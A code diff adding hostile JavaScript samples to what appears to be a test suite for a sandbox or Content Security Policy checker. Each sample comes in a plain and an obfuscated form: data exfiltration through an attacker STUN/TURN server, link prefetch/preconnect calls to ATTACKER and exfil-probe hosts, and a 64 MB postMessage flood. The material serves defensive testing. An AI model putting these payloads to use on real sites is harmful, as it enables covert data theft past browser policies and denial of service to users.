@@ -126,6 +126,26 @@ SAMPLES: tuple[Hostile, ...] = (
         ("dynamic_import", 'import("data:text/javascript,export default 1")', 'new G["Function"]("return im" + "port(\'data:text/javascript,export default 1\')")()'),
         ("worker", 'new Worker(URL.createObjectURL(new Blob(["1"])))', 'new G["Worker"](G["URL"]["createObjectURL"](new Blob(["1"])))'),
     )),
+    Hostile("webrtc_exfil", "RTCPeerConnection with an attacker stun:/turn: server (CSP has no WebRTC directive; username/credential carry data)", ("network_api",), (
+        ("rtc", '(() => { const pc = new RTCPeerConnection({iceServers: [{urls: "stun:__UDP__"}, {urls: "turn:__UDP__", username: "exfil-__TAG__", credential: "c"}]}); '
+                'pc.createDataChannel("x"); return pc.createOffer().then((o: any) => pc.setLocalDescription(o)).then(() => "offered"); })()',
+                '(() => { const pc = new G["RTCPeerConnection"]({iceServers: [{urls: "stun:__UDP__"}, {urls: "turn:__UDP__", username: "exfil-__TAG__", credential: "c"}]}); '
+                'pc["createDataChannel"]("x"); return pc["createOffer"]().then((o: any) => pc["setLocalDescription"](o)).then(() => "offered"); })()'),
+    ), wait_ms=4500),
+    Hostile("link_hints", "<link rel=dns-prefetch|preconnect> created from the DOM: a DNS name and a TCP connection that connect-src does not govern", ("realm_access", "markup_tag"), (
+        ("dns_prefetch", '(() => { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "//__TAG__.exfil-probe.test"; document.head.appendChild(l); return "appended"; })()',
+                         '(() => { const l = G["document"]["createElement"]("li" + "nk"); l.rel = "dns-prefetch"; l.href = "/" + "/__TAG__.exfil-probe.test"; G["document"]["head"].appendChild(l); return "appended"; })()'),
+        ("preconnect", '(() => { const l = document.createElement("link"); l.rel = "preconnect"; l.href = "__PRECONNECT__"; document.head.appendChild(l); return "appended"; })()',
+                       '(() => { const l = G["document"]["createElement"]("li" + "nk"); l.rel = "preconnect"; l.href = "__PRECONNECT__"; G["document"]["head"].appendChild(l); return "appended"; })()'),
+        ("prefetch", '(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = ATTACKER + "/prefetch"; document.head.appendChild(l); return "appended"; })()',
+                     '(() => { const l = G["document"]["createElement"]("li" + "nk"); l.rel = "prefetch"; l.href = ATTACKER + "/prefetch"; G["document"]["head"].appendChild(l); return "appended"; })()'),
+        ("preload", '(() => { const l = document.createElement("link"); l.rel = "preload"; l.as = "image"; l.href = ATTACKER + "/preload"; document.head.appendChild(l); return "appended"; })()',
+                    '(() => { const l = G["document"]["createElement"]("li" + "nk"); l.rel = "preload"; l.as = "image"; l.href = ATTACKER + "/preload"; G["document"]["head"].appendChild(l); return "appended"; })()'),
+    ), wait_ms=4500),
+    Hostile("huge_message", "a 64 MB postMessage toward the host (structured clone happens before any handler)", ("realm_access", "worker_or_channel"),
+            body_direct="window.parent.postMessage({rs: 1, type: \"error\", message: \"x\".repeat(64 * 1024 * 1024)}, \"*\");",
+            body_evasive="G[\"parent\"][\"postMessage\"]({rs: 1, type: \"error\", message: \"x\".repeat(64 * 1024 * 1024)}, \"*\");",
+            runtime="alive", wait_ms=4500),
     Hostile("infinite_loop", "a synchronous infinite loop at load", ("unbounded_loop",),
             body_direct="while (true) { /* spin */ }",
             body_evasive="let spin = 0; for (let i = 0; i < 1; ) { spin += 0; }",
